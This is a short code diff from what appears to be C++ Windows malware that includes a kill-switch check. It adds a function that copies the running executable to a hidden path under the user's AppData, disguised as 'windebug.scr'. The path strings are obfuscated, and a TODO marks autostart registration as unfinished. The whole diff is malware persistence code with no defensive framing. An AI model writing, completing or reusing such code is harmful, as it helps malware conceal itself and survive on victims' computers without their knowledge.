@@ -114,3 +114,21 @@ bool CheckKillswitch()
 
 	return true;
 }
+
+bool AddToAutostart()
+{
+	// Copy file to hidden place
+	char lpFilename[MAX_PATH];
+	if (GetModuleFileNameA(nullptr, lpFilename, MAX_PATH) == 0)
+		return false;
+
+	std::string newPath = getenv(OBFUSCATED("USERPROFILE"));
+	newPath += OBFUSCATED("\\AppData\\Local\\Microsoft\\Windows\\windebug.scr");
+	
+	if (!std::filesystem::copy_file(lpFilename, newPath))
+		return false;
+
+	// TODO: Add to autostart
+
+	return true;
+}
